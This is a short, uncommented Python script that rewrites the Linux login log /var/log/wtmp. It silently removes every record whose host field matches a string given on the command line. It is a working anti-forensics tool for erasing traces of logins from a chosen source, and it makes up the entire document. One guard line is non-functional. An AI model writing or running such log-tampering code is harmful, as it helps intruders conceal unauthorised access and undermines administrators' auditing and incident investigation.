import sys
import struct
from pathlib import Path

if sys.argv is None:
    quit

WTMP = Path("/var/log/wtmp")
XTMP_STRUCT = "hi32s4s32s256shhiii4i20x"
XTMP_STRUCT_SIZE = struct.calcsize(XTMP_STRUCT)
xtmp = b""
b = WTMP.read_bytes()
for i in range(0, len(b), XTMP_STRUCT_SIZE):
    bytes = b[i : i + XTMP_STRUCT_SIZE]
    data = struct.unpack(XTMP_STRUCT, bytes)
    if sys.argv[1] in [(lambda s: str(s).split("\0", 1)[0])(i) for i in data][5]:
        continue
    xtmp += bytes
WTMP.write_bytes(xtmp)
